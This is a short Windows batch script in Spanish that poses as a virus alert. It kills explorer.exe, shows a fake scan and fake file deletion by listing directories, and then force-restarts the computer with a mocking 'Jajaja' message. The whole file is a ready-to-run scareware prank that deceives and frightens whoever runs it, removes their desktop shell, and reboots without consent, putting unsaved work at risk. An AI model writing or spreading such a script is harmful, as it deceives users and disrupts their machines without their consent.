@echo off
title Virus detectado
echo Error 8e5e05f6: Archivos infectados
taskkill /F /IM explorer.exe
msg * Prersiona una tecla para reparar las amenazas
pause >nul
dir /s
echo Analizando...
echo.
pause
cls
dir /s
echo.
pause
cls
echo Borrando archivos...
echo.
pause
dir /s
cls
echo Archivos borrados
echo.
pause
cls
pause
shutdown -r -t 2 -c "Jajaja"


